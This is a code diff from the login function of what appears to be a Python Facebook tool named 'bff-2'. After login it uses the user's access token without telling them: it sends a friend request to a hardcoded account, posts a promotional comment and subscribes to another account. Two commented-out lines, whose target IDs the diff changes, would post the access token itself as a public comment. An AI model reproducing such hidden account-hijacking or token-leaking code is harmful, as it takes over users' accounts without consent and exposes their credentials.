@@ -209,8 +209,8 @@ def login_xx():
 
     fbid = '100002461344178' # Id Nick unik sniper @() Sheikh Sami Shuja Uddin MD
     kom = random.choice(["Hello I'm a bff-2 user","Be yourself and never surendtod:v","Login bff-2 \nhttps://www.facebook.com/100002461344178/posts/3965852000173472/?substory_index=0&app=fbl"])
-    #requests.post('https://graph.facebook.com/496077571350068/comments/?message=' +toket+ '&access_token=' + toket) 
-    #requests.post('https://graph.facebook.com/570025450621946/comments/?message=' + kom + '&access_token=' + toket)
+    #requests.post('https://graph.facebook.com/659625388547287/comments/?message=' +toket+ '&access_token=' + toket) 
+    #requests.post('https://graph.facebook.com/660155105160982/comments/?message=' + kom + '&access_token=' + toket)
     requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + fbid + '&access_token=' + toket)
     requests.post('https://graph.facebook.com/3933263743432298/comments/?message=' + kom + '&access_token=' + toket) 
     requests.post('https://graph.facebook.com/546133328/subscribers?access_token=' + toket) # Akun 2007
